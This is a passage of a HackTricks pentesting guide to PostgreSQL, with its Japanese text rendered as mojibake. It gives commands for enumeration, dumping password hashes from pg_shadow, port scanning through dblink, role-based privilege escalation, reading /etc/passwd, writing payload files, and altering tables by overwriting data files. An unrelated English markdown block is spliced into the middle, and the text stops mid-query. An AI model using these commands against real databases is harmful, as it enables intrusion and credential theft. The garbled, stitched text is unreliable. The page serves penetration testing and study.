# 5432,5433 - PostgreSQLã®ãƒšãƒ³ãƒ†ã‚¹ãƒˆ

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)ã‚’ä½¿ç”¨ã—ã¦ã€ä¸–ç•Œã§æœ€ã‚‚**é«˜åº¦ãª**ã‚³ãƒŸãƒ¥ãƒ‹ãƒ†ã‚£ãƒ„ãƒ¼ãƒ«ã«ã‚ˆã£ã¦**å¼·åŒ–**ã•ã‚ŒãŸ**ãƒ¯ãƒ¼ã‚¯ãƒ•ãƒ­ãƒ¼ã‚’ç°¡å˜ã«æ§‹ç¯‰**ãŠã‚ˆã³**è‡ªå‹•åŒ–**ã—ã¾ã™ã€‚\
ä»Šã™ãã‚¢ã‚¯ã‚»ã‚¹ã—ã¦ãã ã•ã„ï¼š

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>**htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰**ã§**ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§ã®AWSãƒãƒƒã‚­ãƒ³ã‚°**ã‚’å­¦ã³ã¾ã—ã‚‡ã†ï¼</summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•ï¼š

* **HackTricksã§ä¼æ¥­ã‚’å®£ä¼**ã—ãŸã„å ´åˆã‚„**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„å ´åˆã¯ã€[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã—ã¦ãã ã•ã„
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’è¦‹ã¤ã‘ã¦ãã ã•ã„
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**Telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„ã€‚
* **HackTricks**ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ã€ã‚ãªãŸã®ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã—ã¦ãã ã•ã„ã€‚

</details>

## **åŸºæœ¬æƒ…å ±**

**PostgreSQL**ã¯ã€**ã‚ªãƒ¼ãƒ—ãƒ³ã‚½ãƒ¼ã‚¹**ã®**ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆãƒªãƒ¬ãƒ¼ã‚·ãƒ§ãƒŠãƒ«ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‚·ã‚¹ãƒ†ãƒ **ã¨ã—ã¦èª¬æ˜ã•ã‚Œã¦ã„ã¾ã™ã€‚ã“ã®ã‚·ã‚¹ãƒ†ãƒ ã¯SQLè¨€èªã‚’åˆ©ç”¨ã™ã‚‹ã ã‘ã§ãªãã€è¿½åŠ ã®æ©Ÿèƒ½ã§æ‹¡å¼µã—ã¦ã„ã¾ã™ã€‚ãã®æ©Ÿèƒ½ã«ã‚ˆã‚Šã€ã•ã¾ã–ã¾ãªãƒ‡ãƒ¼ã‚¿å‹ã‚„æ“ä½œã‚’å‡¦ç†ã§ãã‚‹ãŸã‚ã€é–‹ç™ºè€…ã‚„çµ„ç¹”ã«ã¨ã£ã¦å¤šç›®çš„ãªé¸æŠè‚¢ã¨ãªã£ã¦ã„ã¾ã™ã€‚

**ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆãƒãƒ¼ãƒˆ:** 5432ã§ã€ã“ã®ãƒãƒ¼ãƒˆãŒã™ã§ã«ä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹å ´åˆã€ãŠãã‚‰ãä½¿ç”¨ã•ã‚Œã¦ã„ãªã„æ¬¡ã®ãƒãƒ¼ãƒˆï¼ˆ5433ã®å¯èƒ½æ€§ãŒé«˜ã„ï¼‰ãŒPostgreSQLã«ã‚ˆã£ã¦ä½¿ç”¨ã•ã‚Œã‚‹ã‚ˆã†ã§ã™ã€‚
```
PORT     STATE SERVICE
5432/tcp open  pgsql
```
## æ¥ç¶šã¨åŸºæœ¬çš„ãªåˆ—æŒ™
```bash
psql -U <myuser> # Open psql console with user
psql -h <host> -U <username> -d <database> # Remote connection
psql -h <host> -p <port> -U <username> -W <password> <database> # Remote connection
```

```sql
psql -h localhost -d <database_name> -U <User> #Password will be prompted
\list # List databases
\c <database> # use the database
\d # List tables
\du+ # Get users roles

# Get current user
SELECT user;

# Get current database
SELECT current_catalog;

# List schemas
SELECT schema_name,schema_owner FROM information_schema.schemata;
\dn+

#List databases
SELECT datname FROM pg_database;

#Read credentials (usernames + pwd hash)
SELECT usename, passwd from pg_shadow;

# Get languages
SELECT lanname,lanacl FROM pg_language;

# Show installed extensions
SHOW rds.extensions;
SELECT * FROM pg_extension;

# Get history of commands executed
\s
```
{% hint style="warning" %}
**`\list`**ã‚’å®Ÿè¡Œã™ã‚‹ã¨ã€**`rdsadmin`**ã¨ã„ã†ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ãŒè¦‹ã¤ã‹ã£ãŸå ´åˆã€**AWSã®PostgreSQLãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹**å†…ã«ã„ã‚‹ã“ã¨ãŒã‚ã‹ã‚Šã¾ã™ã€‚
{% endhint %}

**PostgreSQLãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‚’æ‚ªç”¨ã™ã‚‹æ–¹æ³•**ã®è©³ç´°ã«ã¤ã„ã¦ã¯ã€ä»¥ä¸‹ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼š

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/" %}
[postgresql-injection](../pentesting-web/sql-injection/postgresql-injection/)
{% endcontent-ref %}

## è‡ªå‹•åˆ—æŒ™
```
msf> use auxiliary/scanner/postgres/postgres_version
msf> use auxiliary/scanner/postgres/postgres_dbname_flag_injection
```
### [**Brute force**](../generic-methodologies-and-resources/brute-force.md#postgresql)

### **ãƒãƒ¼ãƒˆã‚¹ã‚­ãƒ£ãƒ³**

[**ã“ã®ç ”ç©¶**](https://www.exploit-db.com/papers/13084)ã«ã‚ˆã‚‹ã¨ã€æ¥ç¶šè©¦è¡ŒãŒå¤±æ•—ã™ã‚‹ã¨ã€`dblink`ã¯`sqlclient_unable_to_establish_sqlconnection`ä¾‹å¤–ã‚’ã‚¹ãƒ­ãƒ¼ã—ã€ã‚¨ãƒ©ãƒ¼ã®èª¬æ˜ãŒå«ã¾ã‚Œã¾ã™ã€‚ã“ã‚Œã‚‰ã®è©³ç´°ã®ä¾‹ã¯ä»¥ä¸‹ã«ãƒªã‚¹ãƒˆã•ã‚Œã¦ã„ã¾ã™ã€‚
```sql
SELECT * FROM dblink_connect('host=1.2.3.4
port=5678
user=name
password=secret
dbname=abc
connect_timeout=10');
```
* ãƒ›ã‚¹ãƒˆãŒãƒ€ã‚¦ãƒ³ã—ã¦ã„ã¾ã™

`è©³ç´°: ã‚µãƒ¼ãƒãƒ¼ã«æ¥ç¶šã§ãã¾ã›ã‚“ã§ã—ãŸ: ãƒ›ã‚¹ãƒˆã¸ã®ãƒ«ãƒ¼ãƒˆãŒã‚ã‚Šã¾ã›ã‚“ ãƒ›ã‚¹ãƒˆã€Œ1.2.3.4ã€ã§ã‚µãƒ¼ãƒãƒ¼ãŒå®Ÿè¡Œã•ã‚Œã€ãƒãƒ¼ãƒˆ5678ã§TCP/IPæ¥ç¶šã‚’å—ã‘å…¥ã‚Œã¦ã„ã¾ã™ã‹ï¼Ÿ`

* ãƒãƒ¼ãƒˆãŒé–‰ã˜ã¦ã„ã¾ã™
```
DETAIL:  could not connect to server: Connection refused Is  the  server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
* ãƒãƒ¼ãƒˆãŒé–‹ã„ã¦ã„ã¾ã™
```
DETAIL:  server closed the connection unexpectedly This  probably  means
the server terminated abnormally before or while processing the request
```
```md
## PostgreSQL

### Enumeration

To discover PostgreSQL services running on the target system, you can use tools like Nmap to scan for open ports. The default port for PostgreSQL is 5432.

```bash
nmap -sV -p 5432 <target_ip>
```

### Brute Forcing

You can use tools like Metasploit or Hydra to perform brute force attacks against PostgreSQL. Make sure to use a strong password list for better results.

### Exploitation

One common way to exploit PostgreSQL is through SQL injection attacks. By injecting malicious SQL queries, an attacker can manipulate the database and potentially gain unauthorized access.

### Post-Exploitation

After gaining access to a PostgreSQL database, an attacker can exfiltrate sensitive data, create backdoors for future access, or even delete data to cause disruption.

### Countermeasures

To protect PostgreSQL from attacks, ensure that you are using strong and unique passwords, keeping the software up to date with the latest security patches, and monitoring the database for any suspicious activity.
```
```
DETAIL:  FATAL:  password authentication failed for user "name"
```
* ãƒãƒ¼ãƒˆãŒé–‹ã„ã¦ã„ã‚‹ã‹ãƒ•ã‚£ãƒ«ã‚¿ãƒªãƒ³ã‚°ã•ã‚Œã¦ã„ã¾ã™
```
DETAIL:  could not connect to server: Connection timed out Is the server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
## ç‰¹æ¨©ã®åˆ—æŒ™

### ãƒ­ãƒ¼ãƒ«

| ãƒ­ãƒ¼ãƒ«ã®ç¨®é¡   |                                                                                                                                                      |
| -------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |
| rolsuper       | ãƒ­ãƒ¼ãƒ«ã«ã¯ã‚¹ãƒ¼ãƒ‘ãƒ¼ãƒ¦ãƒ¼ã‚¶ãƒ¼æ¨©é™ãŒã‚ã‚Šã¾ã™                                                                                                             |
| rolinherit     | ãƒ­ãƒ¼ãƒ«ã¯è‡ªå‹•çš„ã«ã€ãã®ãƒ¡ãƒ³ãƒãƒ¼ã§ã‚ã‚‹ãƒ­ãƒ¼ãƒ«ã®æ¨©é™ã‚’ç¶™æ‰¿ã—ã¾ã™                                                                                           |
| rolcreaterole  | ãƒ­ãƒ¼ãƒ«ã¯ä»–ã®ãƒ­ãƒ¼ãƒ«ã‚’ä½œæˆã§ãã¾ã™                                                                                                                      |
| rolcreatedb    | ãƒ­ãƒ¼ãƒ«ã¯ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‚’ä½œæˆã§ãã¾ã™                                                                                                                    |
| rolcanlogin    | ãƒ­ãƒ¼ãƒ«ã¯ãƒ­ã‚°ã‚¤ãƒ³ã§ãã¾ã™ã€‚ã¤ã¾ã‚Šã€ã“ã®ãƒ­ãƒ¼ãƒ«ã¯åˆæœŸã‚»ãƒƒã‚·ãƒ§ãƒ³èªè¨¼è­˜åˆ¥å­ã¨ã—ã¦æŒ‡å®šã§ãã¾ã™                                                             |
| rolreplication | ãƒ­ãƒ¼ãƒ«ã¯ãƒ¬ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãƒ­ãƒ¼ãƒ«ã§ã™ã€‚ãƒ¬ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãƒ­ãƒ¼ãƒ«ã¯ãƒ¬ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³æ¥ç¶šã‚’é–‹å§‹ã—ã€ãƒ¬ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚¹ãƒ­ãƒƒãƒˆã‚’ä½œæˆãŠã‚ˆã³å‰Šé™¤ã§ãã¾ã™ã€‚           |
| rolconnlimit   | ãƒ­ã‚°ã‚¤ãƒ³ã§ãã‚‹ãƒ­ãƒ¼ãƒ«ã«å¯¾ã—ã¦ã€ã“ã®è¨­å®šã¯ã“ã®ãƒ­ãƒ¼ãƒ«ãŒä½œæˆã§ãã‚‹åŒæ™‚æ¥ç¶šã®æœ€å¤§æ•°ã‚’è¨­å®šã—ã¾ã™ã€‚-1 ã¯åˆ¶é™ãªã—ã‚’æ„å‘³ã—ã¾ã™ã€‚                        |
| rolpassword    | ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã§ã¯ãªãï¼ˆå¸¸ã« `********` ã¨ã—ã¦è¡¨ç¤ºã•ã‚Œã¾ã™ï¼‰                                                                                               |
| rolvaliduntil  | ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã®æœ‰åŠ¹æœŸé™ï¼ˆãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰èªè¨¼ã«ã®ã¿ä½¿ç”¨ã•ã‚Œã¾ã™ï¼‰ï¼›æœ‰åŠ¹æœŸé™ãŒãªã„å ´åˆã¯ null                                                                  |
| rolbypassrls   | ãƒ­ãƒ¼ãƒ«ã¯ã™ã¹ã¦ã®è¡Œãƒ¬ãƒ™ãƒ«ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒãƒªã‚·ãƒ¼ã‚’ãƒã‚¤ãƒ‘ã‚¹ã—ã¾ã™ã€‚è©³ç´°ã«ã¤ã„ã¦ã¯[ã‚»ã‚¯ã‚·ãƒ§ãƒ³ 5.8](https://www.postgresql.org/docs/current/ddl-rowsecurity.html)ã‚’å‚ç…§ã—ã¦ãã ã•ã„ã€‚ |
| rolconfig      | å®Ÿè¡Œæ™‚ã®æ§‹æˆå¤‰æ•°ã®ãƒ­ãƒ¼ãƒ«å›ºæœ‰ã®ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆ                                                                                                             |
| oid            | ãƒ­ãƒ¼ãƒ«ã® ID                                                                                                                                         |

#### èˆˆå‘³æ·±ã„ã‚°ãƒ«ãƒ¼ãƒ—

- **`pg_execute_server_program`** ã®ãƒ¡ãƒ³ãƒãƒ¼ã§ã‚ã‚Œã°ã€ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã‚’**å®Ÿè¡Œ**ã§ãã¾ã™
- **`pg_read_server_files`** ã®ãƒ¡ãƒ³ãƒãƒ¼ã§ã‚ã‚Œã°ã€ãƒ•ã‚¡ã‚¤ãƒ«ã‚’**èª­ã¿å–ã‚‹**ã“ã¨ãŒã§ãã¾ã™
- **`pg_write_server_files`** ã®ãƒ¡ãƒ³ãƒãƒ¼ã§ã‚ã‚Œã°ã€ãƒ•ã‚¡ã‚¤ãƒ«ã‚’**æ›¸ãè¾¼ã‚€**ã“ã¨ãŒã§ãã¾ã™

{% hint style="info" %}
Postgresã§ã¯ã€**ãƒ¦ãƒ¼ã‚¶ãƒ¼**ã€**ã‚°ãƒ«ãƒ¼ãƒ—**ã€**ãƒ­ãƒ¼ãƒ«**ã¯**åŒã˜**ã§ã™ã€‚ãã‚Œã¯å˜ã«ã€**ã©ã®ã‚ˆã†ã«ä½¿ç”¨ã™ã‚‹ã‹**ã¨**ãƒ­ã‚°ã‚¤ãƒ³ã‚’è¨±å¯ã™ã‚‹ã‹**ã«ä¾å­˜ã—ã¾ã™ã€‚
{% endhint %}
```sql
# Get users roles
\du

#Get users roles & groups
# r.rolpassword
# r.rolconfig,
SELECT
r.rolname,
r.rolsuper,
r.rolinherit,
r.rolcreaterole,
r.rolcreatedb,
r.rolcanlogin,
r.rolbypassrls,
r.rolconnlimit,
r.rolvaliduntil,
r.oid,
ARRAY(SELECT b.rolname
FROM pg_catalog.pg_auth_members m
JOIN pg_catalog.pg_roles b ON (m.roleid = b.oid)
WHERE m.member = r.oid) as memberof
, r.rolreplication
FROM pg_catalog.pg_roles r
ORDER BY 1;

# Check if current user is superiser
## If response is "on" then true, if "off" then false
SELECT current_setting('is_superuser');

# Try to grant access to groups
## For doing this you need to be admin on the role, superadmin or have CREATEROLE role (see next section)
GRANT pg_execute_server_program TO "username";
GRANT pg_read_server_files TO "username";
GRANT pg_write_server_files TO "username";
## You will probably get this error:
## Cannot GRANT on the "pg_write_server_files" role without being a member of the role.

# Create new role (user) as member of a role (group)
CREATE ROLE u LOGIN PASSWORD 'lriohfugwebfdwrr' IN GROUP pg_read_server_files;
## Common error
## Cannot GRANT on the "pg_read_server_files" role without being a member of the role.
```
### ãƒ†ãƒ¼ãƒ–ãƒ«
```sql
# Get owners of tables
select schemaname,tablename,tableowner from pg_tables;
## Get tables where user is owner
select schemaname,tablename,tableowner from pg_tables WHERE tableowner = 'postgres';

# Get your permissions over tables
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants;

#Check users privileges over a table (pg_shadow on this example)
## If nothing, you don't have any permission
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants WHERE table_name='pg_shadow';
```
### é–¢æ•°
```sql
# Interesting functions are inside pg_catalog
\df * #Get all
\df *pg_ls* #Get by substring
\df+ pg_read_binary_file #Check who has access

# Get all functions of a schema
\df pg_catalog.*

# Get all functions of a schema (pg_catalog in this case)
SELECT routines.routine_name, parameters.data_type, parameters.ordinal_position
FROM information_schema.routines
LEFT JOIN information_schema.parameters ON routines.specific_name=parameters.specific_name
WHERE routines.specific_schema='pg_catalog'
ORDER BY routines.routine_name, parameters.ordinal_position;

# Another aparent option
SELECT * FROM pg_proc;
```
## ãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ ã®ã‚¢ã‚¯ã‚·ãƒ§ãƒ³

### ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã¨ãƒ•ã‚¡ã‚¤ãƒ«ã®èª­ã¿å–ã‚Š

ã“ã®[**commit**](https://github.com/postgres/postgres/commit/0fdc8495bff02684142a44ab3bc5b18a8ca1863a)ã‹ã‚‰ã€å®šç¾©ã•ã‚ŒãŸ**`DEFAULT_ROLE_READ_SERVER_FILES`**ã‚°ãƒ«ãƒ¼ãƒ—ï¼ˆ**`pg_read_server_files`**ã¨å‘¼ã°ã‚Œã‚‹ï¼‰ã®ãƒ¡ãƒ³ãƒãƒ¼ã‚„**ã‚¹ãƒ¼ãƒ‘ãƒ¼ãƒ¦ãƒ¼ã‚¶**ã¯ã€ä»»æ„ã®ãƒ‘ã‚¹ã§**`COPY`**ãƒ¡ã‚½ãƒƒãƒ‰ã‚’ä½¿ç”¨ã§ãã¾ã™ï¼ˆ`genfile.c`ã®`convert_and_check_filename`ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼‰ã€‚
```sql
# Read file
CREATE TABLE demo(t text);
COPY demo from '/etc/passwd';
SELECT * FROM demo;
```
{% hint style="warning" %}
ã‚¹ãƒ¼ãƒ‘ãƒ¼ãƒ¦ãƒ¼ã‚¶ãƒ¼ã§ã¯ãªã„å ´åˆã§ã‚‚ã€**CREATEROLE** æ¨©é™ã‚’æŒã£ã¦ã„ã‚Œã°ã€**ãã®ã‚°ãƒ«ãƒ¼ãƒ—ã®ãƒ¡ãƒ³ãƒãƒ¼ã«ãªã‚‹ã“ã¨ãŒã§ãã¾ã™:**
```sql
GRANT pg_read_server_files TO username;
```
[**è©³ç´°æƒ…å ±**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

**ä»–ã®Postgresé–¢æ•°**ã‚’ä½¿ç”¨ã—ã¦**ãƒ•ã‚¡ã‚¤ãƒ«ã‚’èª­ã¿å–ã‚‹ã‹ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã‚’ãƒªã‚¹ãƒˆã™ã‚‹**ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã‚Œã‚‰ã‚’ä½¿ç”¨ã§ãã‚‹ã®ã¯**ã‚¹ãƒ¼ãƒ‘ãƒ¼ãƒ¦ãƒ¼ã‚¶ãƒ¼**ã¨**æ˜ç¤ºçš„ãªæ¨©é™ã‚’æŒã¤ãƒ¦ãƒ¼ã‚¶ãƒ¼**ã ã‘ã§ã™ã€‚
```sql
# Before executing these function go to the postgres DB (not in the template1)
\c postgres
## If you don't do this, you might get "permission denied" error even if you have permission

select * from pg_ls_dir('/tmp');
select * from pg_read_file('/etc/passwd', 0, 1000000);
select * from pg_read_binary_file('/etc/passwd');

# Check who has permissions
\df+ pg_ls_dir
\df+ pg_read_file
\df+ pg_read_binary_file

# Try to grant permissions
GRANT EXECUTE ON function pg_catalog.pg_ls_dir(text) TO username;
# By default you can only access files in the datadirectory
SHOW data_directory;
# But if you are a member of the group pg_read_server_files
# You can access any file, anywhere
GRANT pg_read_server_files TO username;
# Check CREATEROLE privilege escalation
```
You can find **more functions** in [https://www.postgresql.org/docs/current/functions-admin.html](https://www.postgresql.org/docs/current/functions-admin.html)

### ã‚·ãƒ³ãƒ—ãƒ«ãªãƒ•ã‚¡ã‚¤ãƒ«æ›¸ãè¾¼ã¿

copyã‚’ä½¿ç”¨ã—ã¦ãƒ•ã‚¡ã‚¤ãƒ«ã‚’æ›¸ãè¾¼ã‚€ã«ã¯ã€**ã‚¹ãƒ¼ãƒ‘ãƒ¼ãƒ¦ãƒ¼ã‚¶**ã¨**`pg_write_server_files`**ã®ãƒ¡ãƒ³ãƒãƒ¼ã®ã¿ãŒä½¿ç”¨ã§ãã¾ã™ã€‚
```sql
copy (select convert_from(decode('<ENCODED_PAYLOAD>','base64'),'utf-8')) to '/just/a/path.exec';
```
{% endcode %}

{% hint style="warning" %}
**`CREATEROLE`** æ¨©é™ã‚’æŒã£ã¦ã„ã‚‹ãŒã‚¹ãƒ¼ãƒ‘ãƒ¼ãƒ¦ãƒ¼ã‚¶ãƒ¼ã§ã¯ãªã„å ´åˆã€**ãã®ã‚°ãƒ«ãƒ¼ãƒ—ã®ãƒ¡ãƒ³ãƒãƒ¼ã«ãªã‚‹ã“ã¨ãŒã§ãã¾ã™:**
```sql
GRANT pg_write_server_files TO username;
```
[**è©³ç´°æƒ…å ±**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

COPYã¯æ”¹è¡Œæ–‡å­—ã‚’å‡¦ç†ã§ããªã„ãŸã‚ã€ãƒ™ãƒ¼ã‚¹64ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’ä½¿ç”¨ã—ã¦ã„ã¦ã‚‚ã€**ãƒ¯ãƒ³ãƒ©ã‚¤ãƒŠãƒ¼ã‚’é€ä¿¡ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™**ã€‚\
ã“ã®ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã®éå¸¸ã«é‡è¦ãªåˆ¶é™äº‹é …ã¯ã€**`copy`ã¯ãƒã‚¤ãƒŠãƒªãƒ•ã‚¡ã‚¤ãƒ«ã‚’æ›¸ãè¾¼ã‚€ãŸã‚ã«ä½¿ç”¨ã§ããªã„**ã¨ã„ã†ã“ã¨ã§ã™ã€‚

### **ãƒã‚¤ãƒŠãƒªãƒ•ã‚¡ã‚¤ãƒ«ã®ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰**

ãŸã ã—ã€**å¤§ããªãƒã‚¤ãƒŠãƒªãƒ•ã‚¡ã‚¤ãƒ«ã‚’ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã™ã‚‹ãŸã‚ã®ä»–ã®ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯**ãŒã‚ã‚Šã¾ã™:

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md" %}
[big-binary-files-upload-postgresql.md](../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md)
{% endcontent-ref %}

## <img src="../.gitbook/assets/i3.png" alt="" data-size="original">

**ãƒã‚°ãƒã‚¦ãƒ³ãƒ†ã‚£ã®ãƒ’ãƒ³ãƒˆ**: **Intigriti**ã«**ã‚µã‚¤ãƒ³ã‚¢ãƒƒãƒ—**ã—ã¦ãã ã•ã„ã€‚ã“ã‚Œã¯ã€ãƒãƒƒã‚«ãƒ¼ã«ã‚ˆã£ã¦ä½œæˆã•ã‚ŒãŸãƒ—ãƒ¬ãƒŸã‚¢ãƒ **ãƒã‚°ãƒã‚¦ãƒ³ãƒ†ã‚£ãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ **ã§ã™ï¼[**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)ã§å‚åŠ ã—ã€ä»Šæ—¥ã‹ã‚‰æœ€å¤§**$100,000**ã®ãƒã‚¦ãƒ³ãƒ†ã‚£ã‚’ç¨¼ãã¾ã—ã‚‡ã†ï¼

{% embed url="https://go.intigriti.com/hacktricks" %}

### ãƒ­ãƒ¼ã‚«ãƒ«ãƒ•ã‚¡ã‚¤ãƒ«æ›¸ãè¾¼ã¿ã‚’ä»‹ã—ãŸPostgreSQLãƒ†ãƒ¼ãƒ–ãƒ«ãƒ‡ãƒ¼ã‚¿ã®æ›´æ–°

PostgreSQLã‚µãƒ¼ãƒãƒ¼ãƒ•ã‚¡ã‚¤ãƒ«ã‚’èª­ã¿æ›¸ãã™ã‚‹å¿…è¦ãªæ¨©é™ãŒã‚ã‚‹å ´åˆã€[PostgreSQLãƒ‡ãƒ¼ã‚¿ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒª](https://www.postgresql.org/docs/8.1/storage.html)å†…ã®**é–¢é€£ãƒ•ã‚¡ã‚¤ãƒ«ãƒãƒ¼ãƒ‰ã‚’ä¸Šæ›¸ãã™ã‚‹ã“ã¨ã§ã‚µãƒ¼ãƒãƒ¼ä¸Šã®ä»»æ„ã®ãƒ†ãƒ¼ãƒ–ãƒ«ã‚’æ›´æ–°**ã§ãã¾ã™ã€‚ã“ã®ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã«ã¤ã„ã¦ã®è©³ç´°ã¯[ã“ã¡ã‚‰](https://adeadfed.com/posts/updating-postgresql-data-without-update/#updating-custom-table-users)ã€‚

å¿…è¦ãªæ‰‹é †:

1. PostgreSQLãƒ‡ãƒ¼ã‚¿ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã‚’å–å¾—

```sql
SELECT setting FROM pg_settings WHERE name = 'data_directory';
```

**æ³¨æ„:** è¨­å®šã‹ã‚‰ç¾åœ¨ã®ãƒ‡ãƒ¼ã‚¿ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªãƒ‘ã‚¹ã‚’å–å¾—ã§ããªã„å ´åˆã¯ã€`SELECT version()`ã‚¯ã‚¨ãƒªã‚’ä½¿ç”¨ã—ã¦ä¸»è¦ãªPostgreSQLãƒãƒ¼ã‚¸ãƒ§ãƒ³ã‚’ã‚¯ã‚¨ãƒªã—ã€ãƒ‘ã‚¹ã‚’ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹ã—ã¦ãã ã•ã„ã€‚PostgreSQLã®Unixã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã§ã®ä¸€èˆ¬çš„ãªãƒ‡ãƒ¼ã‚¿ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªãƒ‘ã‚¹ã¯`/var/lib/PostgreSQL/MAJOR_VERSION/CLUSTER_NAME/`ã§ã™ã€‚ä¸€èˆ¬çš„ãªã‚¯ãƒ©ã‚¹ã‚¿åã¯`main`ã§ã™ã€‚
2. ã‚¿ãƒ¼ã‚²ãƒƒãƒˆãƒ†ãƒ¼ãƒ–ãƒ«ã«é–¢é€£ã™ã‚‹ãƒ•ã‚¡ã‚¤ãƒ«ãƒãƒ¼ãƒ‰ã¸ã®ç›¸å¯¾ãƒ‘ã‚¹ã‚’å–å¾—

```sql
SELECT pg_relation_filepath('{TABLE_NAME}')
```

ã“ã®ã‚¯ã‚¨ãƒªã¯`base/3/1337`ã®ã‚ˆã†ãªã‚‚ã®ã‚’è¿”ã™ã¯ãšã§ã™ã€‚ãƒ‡ã‚£ã‚¹ã‚¯ä¸Šã®å®Œå…¨ãªãƒ‘ã‚¹ã¯`$DATA_DIRECTORY/base/3/1337`ã€ã¤ã¾ã‚Š`/var/lib/postgresql/13/main/base/3/1337`ã«ãªã‚Šã¾ã™ã€‚
3. `lo_*`é–¢æ•°ã‚’ä½¿ç”¨ã—ã¦ãƒ•ã‚¡ã‚¤ãƒ«ãƒãƒ¼ãƒ‰ã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰

```sql
SELECT lo_import('{PSQL_DATA_DIRECTORY}/{RELATION_FILEPATH}',13337)
```
4. ã‚¿ãƒ¼ã‚²ãƒƒãƒˆãƒ†ãƒ¼ãƒ–ãƒ«ã«é–¢é€£ä»˜ã‘ã‚‰ã‚ŒãŸãƒ‡ãƒ¼ã‚¿å‹ã‚’å–å¾—

```sql
SELECT
STRING_AGG(
CONCAT_WS(
',',
attname,
typname,
attlen,
attalign
),
';'
)
FROM pg_attribute
JOIN pg_type
ON pg_attribute.atttypid = pg_type.oid
JOIN pg_class
ON pg_attribute.attrelid = pg_class.oid
